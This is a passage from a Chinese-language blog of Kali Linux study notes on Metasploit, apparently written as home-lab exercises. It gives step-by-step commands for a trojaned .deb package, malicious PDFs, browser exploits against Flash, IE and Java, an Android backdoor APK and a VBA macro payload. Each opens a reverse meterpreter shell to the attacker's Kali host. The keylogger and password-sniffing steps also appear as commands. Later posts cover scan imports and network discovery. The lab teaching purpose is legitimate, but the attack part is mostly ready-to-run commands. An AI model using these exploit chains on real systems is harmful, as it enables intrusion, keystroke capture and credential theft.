<li><strong><code>🔺命令：cp free.deb /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole</code></strong> <ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> </li>
<li><strong><code>🔺命令：set payload linux/x86/shell/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：set LPORT 4444</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Bodhi<ul>
<li>浏览器访问<a href="http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）" target="_blank" rel="noopener">http://Kali的IP/bodhi.deb，下载并保存（/root/bodhi/Downloads）</a></li>
<li><strong><code>🔺命令：sudp dpkg -i free.deb</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否已经获得shell</li>
</ul>
</li>
<li>▲ 2020.03.01 freesweep程序为1.0.1-1，amd64架构，暂无法找到0.90-1，i386架构</li>
<li>▲ 2020.03.01 无法拿到shell，但能看到分步(stage)发送shell的代码，估计权限问题</li>
</ul>
<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=2943VKOzBws-fXPZvYeClqNi9jnNbtOmUSEM80J3jKa8p6ZZIclAArUm-tmAzsIgjYpsPMTrloK1RFM9c4A_LYB1s8bw0LtYDSIm15uLQznoMU_9Q0pMiJAURx_6OwbUyw&file_name=/freeswap-control.PNG" alt="freesweep-control"></p>
<h4 id="4-利用Acrobat-Reader漏洞执行payload"><a href="#4-利用Acrobat-Reader漏洞执行payload" class="headerlink" title="4. 利用Acrobat Reader漏洞执行payload"></a>4. 利用Acrobat Reader漏洞执行payload</h4><ul>
<li>构造PDF文件：<strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装Acrobat Reader8.1.2</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/fileformat/adobe_utilprintf</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong>（生成一个PDF文件）</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /mnt/hgfs/share/</code></strong>（查看是否被查杀）</li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.pdf /var/www/html</code></strong></li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP/msf.pdf（是否停止工作）" target="_blank" rel="noopener">http://Kali的IP/msf.pdf（是否停止工作）</a></li>
</ul>
</li>
<li>Kali<ul>
<li>压缩为ZIP文件</li>
<li><strong><code>🔺命令：cp /root/.msf4/local/msf.zip /mnt/hgfs/share/</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>解压msf.zip为msf.pdf，双击打开msf.pdf</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>构造恶意网站：<strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装Acrobat Reader8.1.2（小于8.1.3的缓冲区溢出漏洞）</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/browser/adobe_utilprintf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong>（如果不设置，则回生成一个随机字符串）</li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：migrate exploer.exe的PID</code></strong></li>
<li><strong><code>🔺命令：getpid</code></strong></li>
<li><strong><code>🔺命令：use priv</code></strong>（提权）</li>
<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong></li>
<li><strong><code>🔺命令：tailf</code></strong> 查看键盘记录器</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>随机敲击键盘或运行命令</li>
</ul>
</li>
<li>Kali<ul>
<li>查看键盘记录器是否记录</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.02 通过构造恶意网站来拿到shell的模块暂无法成功拿到shell</li>
<li>Meterpreter <ul>
<li><strong><code>🔺命令：use priv</code></strong></li>
<li><strong><code>🔺命令：run post/windows/capture/keylog_recorder</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="5-利用Flash插件漏洞执行payload（对Flash版本要求高）"><a href="#5-利用Flash插件漏洞执行payload（对Flash版本要求高）" class="headerlink" title="5. 利用Flash插件漏洞执行payload（对Flash版本要求高）"></a>5. 利用Flash插件漏洞执行payload（对Flash版本要求高）</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
<li>Window 7（带Flash）<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7（带Flash）<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
<li>Window 7（带Flash）<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/adobe_flash_opaque_background_uaf</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7（带Flash）<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use auxiliary/server/</code></strong>browser_autopwn2（挑选质量较好的payload的集合）<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>Win+R → appwiz.cpl → 查看是否安装了Flash</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use auxiliary/server/browser_autopwn2</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>Android手机<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
</li>
<li>▲ 2020.03.02 很难下载到对应Flash插件版本</li>
</ul>
<h4 id="6-利用IE浏览器漏洞执行payload"><a href="#6-利用IE浏览器漏洞执行payload" class="headerlink" title="6. 利用IE浏览器漏洞执行payload"></a>6. 利用IE浏览器漏洞执行payload</h4><ul>
<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/browser/ms14_064_ole_code_execution</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：sysinfo</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="7-利用JRE漏洞执行payload"><a href="#7-利用JRE漏洞执行payload" class="headerlink" title="7. 利用JRE漏洞执行payload"></a>7. 利用JRE漏洞执行payload</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_driver_manager</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装jre-7u10-windows-i586</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_jmxbean</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>安装jre-7u10-windows-i586</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/browser/java_jre17_reflection_types</code></strong><ul>
<li><strong><code>🔺命令：set SRVPORT 80</code></strong></li>
<li><strong><code>🔺命令：set URIPATH /</code></strong></li>
<li><strong><code>🔺命令：set payload java/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>浏览器访问<a href="http://Kali的IP:80/" target="_blank" rel="noopener">http://Kali的IP:80/</a></li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-生成Android后门程序"><a href="#8-生成Android后门程序" class="headerlink" title="8. 生成Android后门程序"></a>8. 生成Android后门程序</h4><ul>
<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use payload/android/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：generate -f apk -p android -t raw</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload android/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Android<ul>
<li>拷贝a.apk到Android手机</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到了shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：ps</code></strong></li>
<li><strong><code>🔺命令：help</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="9-VBScript感染方式"><a href="#9-VBScript感染方式" class="headerlink" title="9. VBScript感染方式"></a>9. VBScript感染方式</h4><ul>
<li>利用宏感染word、excel文档</li>
<li>绕过某些基于文件类型检查的安全机制</li>
<li>生成vbscript脚本：<strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/ meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe</code></strong></li>
<li>Office 2007 +<ul>
<li>视图–宏–创建</li>
<li>Payload第一部分VBA代码黏入宏创建中</li>
<li>Payload第二部分十六进制代码黏入word文档正文</li>
<li>双击打开则促发攻击</li>
</ul>
</li>
<li>Msf启动侦听<ul>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%9B%9B)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--%E7%BB%93%E5%90%88%E5%A4%96%E9%83%A8%E5%BA%94%E7%94%A8/" itemprop="url">Kali Linux笔记(一百零四)：MSF模块--结合外部应用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T14:41:21+08:00">
                2020-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  208 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Msf–弱点扫描"><a href="#1-Msf–弱点扫描" class="headerlink" title="1. Msf–弱点扫描"></a>1. Msf–弱点扫描</h4><ul>
<li>Openvas<ul>
<li><strong><code>🔺命令：Load openvas</code></strong><ul>
<li>命令行模式，需要配置，使用繁琐</li>
</ul>
</li>
<li>导入nbe格式扫描日志</li>
<li><strong><code>🔺命令：db_import openvas.nbe</code></strong></li>
</ul>
</li>
<li>Nessus</li>
<li>Nexpose<ul>
<li>xml格式日志文件</li>
</ul>
</li>
</ul>
<h4 id="2-实验（Openvas-→-Metasploit）"><a href="#2-实验（Openvas-→-Metasploit）" class="headerlink" title="2. 实验（Openvas → Metasploit）"></a>2. 实验（Openvas → Metasploit）</h4><ul>
<li>开启Openvas，网页模式进行Quick start漏洞扫描，导出nbe日志格式</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：Load openvas</code></strong></li>
<li><strong><code>🔺命令：db_import openvas.nbe</code></strong></li>
<li><strong><code>🔺命令：hosts</code></strong></li>
<li><strong><code>🔺命令：services</code></strong></li>
<li><strong><code>🔺命令：vulns</code></strong></li>
</ul>
<h4 id="3-实验（Nessuse-→-Metasploit）"><a href="#3-实验（Nessuse-→-Metasploit）" class="headerlink" title="3. 实验（Nessuse → Metasploit）"></a>3. 实验（Nessuse → Metasploit）</h4><ul>
<li><strong><code>🔺命令：cd /etc/init.d</code></strong></li>
<li><strong><code>🔺命令：./nessusd start</code></strong></li>
<li>网页查询是否已经正常启动</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：Load nessus</code></strong> </li>
<li>扫描帮助：<strong><code>🔺命令：nessus_help</code></strong> </li>
<li>扫描连接：<strong><code>🔺命令：nessus_connect admin:toor@127.0.0.1</code></strong></li>
<li>扫描策略：<strong><code>🔺命令：nessus_policy_list</code></strong>（若无策略，则需网页建立一个新的策略）</li>
<li>扫描任务：<strong><code>🔺命令：nessus_scan_new &lt;UUID&gt; &lt;Name&gt; &lt;Description&gt; &lt;Target&gt;</code></strong></li>
<li>执行扫描任务：<strong><code>🔺命令：nessus_scan_launch &lt;ID&gt;</code></strong> </li>
<li><strong><code>🔺命令：nessus_report_list</code></strong></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%89)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Auxiliary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%89)%EF%BC%9AMSF%E6%A8%A1%E5%9D%97--Auxiliary/" itemprop="url">Kali Linux笔记(一百零三)：MSF模块--Auxiliary</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-02T13:47:21+08:00">
                2020-03-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  9 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-NMAP扫描"><a href="#1-NMAP扫描" class="headerlink" title="1. NMAP扫描"></a>1. NMAP扫描</h4><ul>
<li><strong><code>🔺命令：db_nmap -sV 192.168.0.0/24</code></strong></li>
</ul>
<h4 id="2-主机发现和端口扫描"><a href="#2-主机发现和端口扫描" class="headerlink" title="2. 主机发现和端口扫描"></a>2. 主机发现和端口扫描</h4><ul>
<li>主机发现<ul>
<li>⭐ auxiliary/scanner</li>
<li>RHOSTS &lt;&gt; RHOST <ul>
<li>192.168.1.20-192.168.1.30，192.168.1.0/24，192.168.11.0/24 </li>
<li>file:/root/h.txt</li>
</ul>
</li>
</ul>
</li>
<li>主机发现（UDP扫描）<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/udp_sweep</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.100-192.168.1.130</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/udp_probe</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.100-192.168.1.130</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>主机发现（ARP扫描）<ul>
<li><strong><code>🔺命令：search arp</code></strong> <ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/discovery/arp_sweep</code></strong> <ul>
<li><strong><code>🔺命令：set INTERFACE</code></strong>（扫描接口）</li>
<li><strong><code>🔺命令：set ̵RHOSTS</code></strong>（目的IP地址）</li>
<li><strong><code>🔺命令：set SHOST</code></strong>（源IP地址）</li>
<li><strong><code>🔺命令：set SMAC</code></strong>（源MAC地址）</li>
<li><strong><code>🔺命令：set PORTS</code></strong>（目标端口号）</li>
<li><strong><code>🔺命令：set THREAD</code></strong>（线程数）</li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>端口扫描<ul>
<li><strong><code>🔺命令：search postscan</code></strong><ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/portscan/syn</code></strong><ul>
<li><strong><code>🔺命令：set INTERFACE eth0</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.0/24</code></strong></li>
<li><strong><code>🔺命令：set PORTS 80</code></strong></li>
<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-IPID-idle扫描"><a href="#3-IPID-idle扫描" class="headerlink" title="3. IPID idle扫描"></a>3. IPID idle扫描</h4><ul>
<li>查找ipidseq主机<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/ip/ipidseq</code></strong><ul>
<li><strong><code>🔺命令：set INTERFACE eth0</code></strong></li>
<li><strong><code>🔺命令：set RHOSTS 192.168.1.0/24</code></strong></li>
<li><strong><code>🔺命令：set PORTS 80</code></strong></li>
<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：nmap -Pn -sI 1.1.1.2 1.1.1.3</code></strong> </li>
</ul>
<h4 id="4-密码嗅探（Metasploit）"><a href="#4-密码嗅探（Metasploit）" class="headerlink" title="4. 密码嗅探（Metasploit）"></a>4. 密码嗅探（Metasploit）</h4><ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/sniffer/psnufle</code></strong><ul>
<li>不选pacap抓包文件格式</li>
<li>ftp登陆Metasploit，输入账号和密码，看是否能密码能被嗅探</li>
</ul>
</li>
<li>▲ 支持从pcap抓包文件中提取密码</li>
<li>功能类似于dsniff</li>
<li>目前只支持pop3、imap、ftp、HTTP GET协议</li>
</ul>
<h4 id="5-SNMP扫描（Metasploit和Window-Server-2003）"><a href="#5-SNMP扫描（Metasploit和Window-Server-2003）" class="headerlink" title="5. SNMP扫描（Metasploit和Window Server 2003）"></a>5. SNMP扫描（Metasploit和Window Server 2003）</h4><ul>
<li><strong><code>🔺命令：vi /etc/default/snmpd</code></strong> #Metasploit侦听地址修改为0.0.0.0<ul>
<li><strong><code>🔺命令：./etc/init.d/snmpd stop</code></strong></li>
<li><strong><code>🔺命令：./etc/init.d/snmpd start</code></strong></li>
</ul>
</li>
<li>▲ 2020.2.27 Metasploit中无SNMP服务</li>
<li>SNMP登陆<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_login</code></strong>（Linux）<ul>
<li>使用默认爆破文件</li>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
<li><strong><code>🔺命令：set THREADS 10</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>SNMP枚举<ul>
<li>⭐ <strong><code>🔺命令：use auxiliary/scanner/snmp/snmp_enum</code></strong>（Linux）<ul>
<li><strong><code>🔺命令：set RHOSTS Metasploit的IP</code></strong></li>
